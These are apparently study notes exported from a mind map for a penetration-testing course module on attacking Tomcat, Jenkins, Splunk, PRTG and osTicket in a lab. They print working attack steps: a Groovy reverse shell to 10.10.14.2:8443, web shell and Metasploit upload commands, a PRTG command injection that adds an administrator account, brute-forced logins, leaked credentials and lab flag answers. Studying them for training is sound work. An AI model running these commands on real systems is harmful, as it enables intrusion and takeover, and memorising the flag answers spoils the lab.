---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Attacking Common Applications"
output_topics: 50
---

# Attacking Common Applications — Outputs 051–100

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

Return to [[Outputs/Modules/Attacking Common Applications Outputs|Attacking Common Applications output index]].

## Outputs

> [!output]+ 🟨 Output 051
> &lt;title&gt;Apache Tomcat 9 (9.0.30)
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → Tomcat servers can be identified by → /docs page → curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat → &lt;title&gt;Apache Tomcat 9 (9.0.30)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 71fafe40-4d7b-48d9-b843-cd60530efa38 -->

> [!output]+ 🟨 Output 052
> &lt;servlet-class&gt;com.inlanefreight.api.AdminServlet&lt;/servlet-class&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → Tomcat servers can be identified by → default documentation page → which may not be removed by administrators → WEB-INF/web.xml → stores information about the routes used by the application and the classes → &lt;servlet-class&gt;com.inlanefreight.api.AdminServlet&lt;/servlet-class&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: afd44032-e41e-4393-86cf-da1a0dfe336b -->

> [!output]+ 🟨 Output 053
> &lt;user username="tomcat" password="tomcat" roles="manager-gui" /&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → Tomcat servers can be identified by → default documentation page → which may not be removed by administrators → tomcat-users.xml → used to allow or disallow access to the /manager and host-manager admin pages. → &lt;user username="tomcat" password="tomcat" roles="manager-gui" /&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 907069ec-adfd-4411-a84d-4c85b9203957 -->

> [!output]+ 🟨 Output 054
> /docs (Status: 302)
> /examples (Status: 302)
> /manager (Status: 302)
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → Enumeration → Gobuster → gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt → /docs (Status: 302)  /examples (Status: 302)  /manager (Status: 302)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1d9de64c-f7b6-4756-bbc1-b58d8eed6314 -->

> [!output]+ 🟨 Output 055
> &lt;title&gt;Apache Tomcat 10 (10.0.10)
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → LAB → What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180? → curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat → &lt;title&gt;Apache Tomcat 10 (10.0.10)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 582da041-bffa-4b5c-ba85-0311627265e3 -->

> [!output]+ 🟨 Output 056
> 401
>
> &lt;role rolename="manager-gui"/&gt;
> &lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → LAB → What role does the admin user have in the configuration example? → web01.inlanefreight.local:8180/ → login to /manager → 401  &lt;role rolename="manager-gui"/&gt; &lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f9a6e3fb-94aa-4010-9490-32cc3a7e8402 -->

> [!output]+ 🟨 Output 057
> (Meterpreter 2)(/) &gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → LAB → What role does the admin user have in the configuration example? → app-dev.inlanefreight.local:8080/managr → MSF → exploit/multi/http/tomcat_mgr_upload → run → (Meterpreter 2)(/) &gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c49515ef-1542-47bf-8a64-b9f330cd9e88 -->

> [!output]+ 🟨 Output 058
> &lt;!--&lt;role rolename="admin-gui" /&gt;
>
> **Source path:** Attacking Common Applications → Part 1 → Tomcat - Discovery &amp; Enumeration → Discovery/Footprinting → LAB → What role does the admin user have in the configuration example? → app-dev.inlanefreight.local:8080/managr → MSF → exploit/multi/http/tomcat_mgr_upload → run → (Meterpreter 2)(/) &gt; → search -f web.xml → cd /opt/tomcat/apache-tomcat-10.0.10/conf → cat tomcat-users.xml → &lt;!--&lt;role rolename="admin-gui" /&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b24b4136-c271-4da7-9fde-405d5d602a47 -->

> [!output]+ 🟨 Output 059
> uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → Tomcat Manager - WAR File Upload → Click on Browse to select the .war file and then click on Deploy → click on backup → 404 Not Found → curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id → uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 643bf24b-ca9a-46d7-a44f-9298baebca56 -->

> [!output]+ 🟨 Output 060
> uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → Tomcat Manager - WAR File Upload → Start a Netcat listener → id → uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 05456c7c-b4a0-4a09-bb78-4c7cf7415198 -->

> [!output]+ 🟨 Output 061
> 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
> 8080/tcp open  http    Apache Tomcat 9.0.30
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → CVE-2020-1938 : Ghostcat → nmap -sV -p 8009,8080 app-dev.inlanefreight.local → 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)  8080/tcp open  http    Apache Tomcat 9.0.30
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bc22ab4e-3a41-4408-bee7-a46a5f8cb6f5 -->

> [!output]+ 🟨 Output 062
> &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
> ...
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → CVE-2020-1938 : Ghostcat → nmap -sV -p 8009,8080 app-dev.inlanefreight.local → 8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)  8080/tcp open  http    Apache Tomcat 9.0.30 → PoC code → python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml → &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt; ...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 944bc964-b0be-43ff-901b-36d91c73961d -->

> [!output]+ 🟨 Output 063
> tomcat:root
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → LAB → Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? → auxiliary/scanner/http/tomcat_mgr_login → tomcat:root
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 439e5e5f-e497-45c2-8712-a2e6f02c2173 -->

> [!output]+ 🟨 Output 064
> admin:admin
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → LAB → Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? → auxiliary/scanner/http/tomcat_mgr_login → admin:admin
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ca74da1d-5afb-429e-aa43-c43b57552a0c -->

> [!output]+ 🟨 Output 065
> root
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → LAB → What is the password? → root
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a09cc8dd-550c-4f19-901e-004e718b6625 -->

> [!output]+ 🟨 Output 066
> uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → LAB → Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt → Upload WAR → curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id → uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 58fb0f95-80a8-46d0-b746-a4ee45df6a3c -->

> [!output]+ 🟨 Output 067
> t0mcat_rc3_ftw!
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat → LAB → Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt → Upload WAR → curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id → look for /webapps/ → curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat%20/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt → t0mcat_rc3_ftw!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2a8fa1c0-49c1-47ed-9e41-91cf8e760a2a -->

> [!output]+ 🟨 Output 068
> 8080/tcp  open  http-proxy
> |_http-title: Apache Tomcat/9.0.17
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → Enumeration → nmap -p- -sC -Pn 10.129.204.227 --open → 8080/tcp  open  http-proxy  |_http-title: Apache Tomcat/9.0.17
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8aa8321c-2585-4b54-ae08-68d140c1bdf0 -->

> [!output]+ 🟨 Output 069
> welcome
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → Enumeration → Finding a CGI script → ffuf → ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat → welcome
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: cabc7c44-c0c2-4071-bd3d-f12fe2274ecd -->

> [!output]+ 🟨 Output 070
> error message indicating that an invalid character
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → Exploitation → whoami doesn't return an output. → set → http://10.129.204.227:8080/cgi/welcome.bat?&amp;c:\windows\system32\whoami.exe → error message indicating that an invalid character
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4542443e-9c0d-48f5-9838-49cc6773be37 -->

> [!output]+ 🟨 Output 071
> 8080/tcp open  http-proxy
> |_http-open-proxy: Proxy might be redirecting requests
> |_http-favicon: Apache Tomcat
> |_http-title: Apache Tomcat/9.0.17
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → LAB → After running the URL Encoded 'whoami' payload, what user is tomcat running as? → nmap 10.129.205.30 -sC -Pn --open → 8080/tcp open  http-proxy |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.17
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: bd70d77c-352f-4d46-a28a-c134652dc21e -->

> [!output]+ 🟨 Output 072
> welcome
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → LAB → After running the URL Encoded 'whoami' payload, what user is tomcat running as? → ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.205.30:8080/cgi/FUZZ.bat → welcome
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 72c34cf9-b006-4390-b8d2-3ca852909f2f -->

> [!output]+ 🟨 Output 073
> Welcome to CGI, this section is not functional yet. Please return to home page.
> feldspar\omen
>
> **Source path:** Attacking Common Applications → Part 1 → Attacking Tomcat CGI → LAB → After running the URL Encoded 'whoami' payload, what user is tomcat running as? → curl 'http://10.129.205.30:8080/cgi/welcome.bat?&amp;c%3A%5Cwindows%5Csystem32%5Cwhoami.exe' → Welcome to CGI, this section is not functional yet. Please return to home page. feldspar\omen
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b6d0c5ee-8cd4-4185-906f-53f02700cf84 -->

> [!output]+ 🟨 Output 074
> 2.303.1
>
> **Source path:** Attacking Common Applications → Part 2 → Jenkins - Discovery &amp; Enumeration → LAB → Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on. → Login -&gt; View Page Source → 2.303.1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 13162f93-52d7-44e5-a0df-4bfe1f69b239 -->

> [!output]+ 🟨 Output 075
> uid=0(root) gid=0(root) groups=0(root)
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → Script Console → /script → run Apache Groovy scripts → functioning similarly to a web shell → def cmd = 'id'  def sout = new StringBuffer(), serr = new StringBuffer()  def proc = cmd.execute()  proc.consumeProcessOutput(sout, serr)  proc.waitForOrKill(1000)  println sout → uid=0(root) gid=0(root) groups=0(root)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0092f824-1e03-4dd0-8267-1b632ce316bf -->

> [!output]+ 🟨 Output 076
> uid=0(root) gid=0(root) groups=0(root)
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → Script Console → /script → run Apache Groovy scripts → functioning similarly to a web shell → nc -lvnp 8443 before it → r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.2/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor() → id → uid=0(root) gid=0(root) groups=0(root)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a021e911-267b-4095-9909-6ebf644b5bfc -->

> [!output]+ 🟨 Output 077
> /var/lib/jenkins3#
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → Script Console → /script → run Apache Groovy scripts → functioning similarly to a web shell → nc -lvnp 8443 before it → r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.2/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor() → id → uid=0(root) gid=0(root) groups=0(root) → /bin/bash -i → /var/lib/jenkins3#
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e86bce13-e51d-4b7f-917e-cc074bb671dc -->

> [!output]+ 🟨 Output 078
> Jenkins 2.303.1
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → LAB → Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory → login as → admin:admin → View Page Source → Jenkins 2.303.1
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c2856db7-c811-48c1-b5b3-d0fb45eceae3 -->

> [!output]+ 🟨 Output 079
> on nc we get
> Connection received on 10.129.201.58 58250
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → LAB → Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory → prepare RCE → write the script in /script → r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.2/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor() → on nc we get Connection received on 10.129.201.58 58250
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d93d5a1d-0593-417e-b302-916f7aa67c2a -->

> [!output]+ 🟨 Output 080
> uid=0(root) gid=0(root) groups=0(root)
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → LAB → Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory → prepare RCE → write the script in /script → r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.2/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor() → on nc we get Connection received on 10.129.201.58 58250 → id → uid=0(root) gid=0(root) groups=0(root)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3a771b95-817e-4c58-9df2-72f76bb9235b -->

> [!output]+ 🟨 Output 081
> f33ling_gr00000vy!
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Jenkins → LAB → Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory → prepare RCE → write the script in /script → r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.2/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor() → on nc we get Connection received on 10.129.201.58 58250 → id → uid=0(root) gid=0(root) groups=0(root) → cat /var/lib/jenkins3/flag.txt → f33ling_gr00000vy!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 9ffb2956-dd58-447d-b9ac-7245c774b465 -->

> [!output]+ 🟨 Output 082
> 8000/tcp open  ssl/http      Splunkd httpd
>
> **Source path:** Attacking Common Applications → Part 2 → Splunk - Discovery &amp; Enumeration → Discovery/Footprinting → sudo nmap -sV 10.129.201.50 → 8000/tcp open  ssl/http      Splunkd httpd
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 86d4e18d-4bdd-4e89-bed2-67b46359d99d -->

> [!output]+ 🟨 Output 083
> 8.2.2
>
> **Source path:** Attacking Common Applications → Part 2 → Splunk - Discovery &amp; Enumeration → LAB → Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3). → https://10.129.201.50:8000 → 8.2.2
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8fa1b662-0f8b-42d1-a4ef-17059de6092b -->

> [!output]+ 🟨 Output 084
> splunk_shell/
> splunk_shell/bin/
> splunk_shell/bin/rev.py
> splunk_shell/bin/run.bat
> splunk_shell/bin/run.ps1
> splunk_shell/default/
> splunk_shell/default/inputs.conf
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Splunk → Abusing Built-In Functionality → Splunk package to assist us → create a tarball or .spl file. → tar -cvzf updater.tar.gz splunk_shell/ → splunk_shell/  splunk_shell/bin/  splunk_shell/bin/rev.py  splunk_shell/bin/run.bat  splunk_shell/bin/run.ps1  splunk_shell/default/  splunk_shell/default/inputs.conf
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: c24968dc-b2b6-4205-b8af-2097b289a3b3 -->

> [!output]+ 🟨 Output 085
> nt authority\system
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Splunk → Abusing Built-In Functionality → choose Install app from file and upload the application → /en-US/manager/search/apps/local → click on browse → choose the tarball we created earlier and click Upload. → whoami → nt authority\system
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2fc2b0d9-51e5-4425-92ca-d9e895b2b9d5 -->

> [!output]+ 🟨 Output 086
> .
> ├── README.md
> ├── reverse_shell_splunk
> │   ├── bin
> │   │   ├── rev.py
> │   │   ├── run.bat
> │   │   └── run.ps1
> │   └── default
> │       └── inputs.conf
> └── updater.tar.gz
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Splunk → Abusing Built-In Functionality → LAB → Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory. → git clone https://github.com/0xjpuff/reverse_shell_splunk.git → cd /reverse_shell_splunk/ → tar -cvzf updater.tar.gz reverse_shell_splunk/ → tree → . ├── README.md ├── reverse_shell_splunk │   ├── bin │   │   ├── rev.py │   │   ├── run.bat │   │   └── run.ps1 │   └── default │       └── inputs.conf └── updater.tar.gz
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: aeefc0a4-183a-412e-8c2e-28b983e01d42 -->

> [!output]+ 🟨 Output 087
> Connection received on 10.129.201.50 51831
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Splunk → Abusing Built-In Functionality → LAB → Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory. → Connection received on 10.129.201.50 51831
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 69e005b6-7ba3-4697-b4de-049aeb5376a6 -->

> [!output]+ 🟨 Output 088
> l00k_ma_no_AutH!
>
> **Source path:** Attacking Common Applications → Part 2 → Attacking Splunk → Abusing Built-In Functionality → LAB → Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory. → Connection received on 10.129.201.50 51831 → cat /loot/flag.txt → l00k_ma_no_AutH!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e939fd57-38b4-4f3a-aca8-c6612fe37e7c -->

> [!output]+ 🟨 Output 089
> 8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → Discovery/Footprinting/Enumeration → found on common web ports such as 80, 443, or 8080 → sudo nmap -sV -p- --open -T4 10.129.201.50 → 8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6815ea33-f891-4e73-ade3-89aee73a4dec -->

> [!output]+ 🟨 Output 090
> &lt;span class="prtgversion"&gt;&amp;nbsp;PRTG Network Monitor 17.3.33.2830 &lt;/span&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → Discovery/Footprinting/Enumeration → cURL → curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version → &lt;span class="prtgversion"&gt;&amp;nbsp;PRTG Network Monitor 17.3.33.2830 &lt;/span&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 270d4e38-c22f-4217-b980-7bfd6a210810 -->

> [!output]+ 🟨 Output 091
> EXE notification is queued up
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → Leveraging Known Vulnerabilities → To begin → Finally, in the parameter field, enter a command → test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add → After clicking Save → redirected to the Notifications page and see our new notification in the list. → click the Test notification button on the right to run our notification → EXE notification is queued up
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d3be170f-9dad-4313-a638-744e14587db6 -->

> [!output]+ 🟨 Output 092
> 8080/tcp open  http    Indy httpd 18.1.37.13946
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → LAB → What version of PRTG is running on the target? → sudo nmap -sV -p 8080 --open -T4 10.129.201.50 → 8080/tcp open  http    Indy httpd 18.1.37.13946
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0c1bfcab-b2a0-4687-a1da-a7f79b2adb6c -->

> [!output]+ 🟨 Output 093
> EXE notification is queued up
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → LAB → Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop. → login with → prtgadmin:Password123 → /myaccount.htm?tabid=2 → Mouse on Setup &gt; Add Notification → in the parameter field, enter a command → test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add → clicking Save → click the Test notification button on the right to run our notification → EXE notification is queued up
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8b944344-3c7b-4f05-8e95-2e8089a0d308 -->

> [!output]+ 🟨 Output 094
> Evil-WinRM PS C:\Users\prtgadm1\Documents&gt;
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → LAB → Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop. → evil-winrm -i 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! → Evil-WinRM PS C:\Users\prtgadm1\Documents&gt;
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 077f7a25-c469-443a-9db4-4949ab905a55 -->

> [!output]+ 🟨 Output 095
> WhOs3_m0nit0ring_wH0?
>
> **Source path:** Attacking Common Applications → Part 2 → PRTG Network Monitor → LAB → Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop. → evil-winrm -i 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! → Evil-WinRM PS C:\Users\prtgadm1\Documents&gt; → cat /users/administrator/desktop/flag.txt → WhOs3_m0nit0ring_wH0?
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e5ef152a-1ec9-4dcf-aad4-c9ad3d5815d4 -->

> [!output]+ 🟨 Output 096
> If you want to add more information to your ticket,just email 940288@inlanefreight.local.
>
> **Source path:** Attacking Common Applications → Part 2 → osTicket → Attacking osTicket → web application-related vulnerabilities → quick example (custom) → we come across a customer support portal → submit a new ticket, → If you want to add more information to your ticket,just email 940288@inlanefreight.local.
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4a8e9076-77c1-4596-bd37-50bbb9db58bf -->

> [!output]+ 🟨 Output 097
> id : 5996447501
> email : julie.clayton@inlanefreight.local
> username : jclayton
> password : JulieC8765!
> hashed_password : 
> name : Julie Clayton
> vin : 
> address : 
> phone : 
> database_name : ModBSolutions
>
>
> id : 7344467234
> email : kevin@inlanefreight.local
> username : kgrimes
> password : Fish1ng_s3ason!
> hashed_password : 
> name : Kevin Grimes
> vin : 
> address : 
> phone : 
> database_name : MyFitnessPal
>
> **Source path:** Attacking Common Applications → Part 2 → osTicket → Attacking osTicket → osTicket - Sensitive Data Exposure → we discover several user credentials using the tool Dehashed → we are on an external penetration test. During our OSINT and information gathering → http://dehashed.com/ → sudo python3 dehashed.py -q inlanefreight.local -p → id : 5996447501  email : julie.clayton@inlanefreight.local  username : jclayton  password : JulieC8765!  hashed_password :   name : Julie Clayton  vin :   address :   phone :   database_name : ModBSolutions      id : 7344467234  email : kevin@inlanefreight.local  username : kgrimes  password : Fish1ng_s3ason!  hashed_password :   name : Kevin Grimes  vin :   address :   phone :   database_name : MyFitnessPal
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 63bffc8d-82de-4a57-8477-0a9f58861107 -->

> [!output]+ 🟨 Output 098
> vpn.inlanefreight.local
> support.inlanefreight.local
> ns1.inlanefreight.local
> mail.inlanefreight.local
> apps.inlanefreight.local
> ftp.inlanefreight.local
> dev.inlanefreight.local
> ir.inlanefreight.local
> auth.inlanefreight.local
> careers.inlanefreight.local
> portal-stage.inlanefreight.local
> dns1.inlanefreight.local
> dns2.inlanefreight.local
> meet.inlanefreight.local
> portal-test.inlanefreight.local
> home.inlanefreight.local
> legacy.inlanefreight.local
>
> **Source path:** Attacking Common Applications → Part 2 → osTicket → Attacking osTicket → osTicket - Sensitive Data Exposure → we have also performed subdomain enumeration → cat ilfreight_subdomains → vpn.inlanefreight.local  support.inlanefreight.local  ns1.inlanefreight.local  mail.inlanefreight.local  apps.inlanefreight.local  ftp.inlanefreight.local  dev.inlanefreight.local  ir.inlanefreight.local  auth.inlanefreight.local  careers.inlanefreight.local  portal-stage.inlanefreight.local  dns1.inlanefreight.local  dns2.inlanefreight.local  meet.inlanefreight.local  portal-test.inlanefreight.local  home.inlanefreight.local  legacy.inlanefreight.local
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ca891878-e156-4b19-bb1d-6831e1b7bc17 -->

> [!output]+ 🟨 Output 099
> kevin@inlanefreight.local:Fish1ng_s3ason!
>
> **Source path:** Attacking Common Applications → Part 2 → osTicket → LAB → Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson. → sign in as agent → use the credentials above → kevin@inlanefreight.local:Fish1ng_s3ason!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 957bf741-978e-405e-bc29-b3fed2510f6a -->

> [!output]+ 🟨 Output 100
> Inlane_welcome!
>
> **Source path:** Attacking Common Applications → Part 2 → osTicket → LAB → Find your way into the osTicket instance and submit the password sent from the Customer Support Agent to the customer Charles Smithson. → we saw VPN Password reset ticket → Inlane_welcome!
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d25d8b10-a22f-4071-94dc-cb7e05efff45 -->
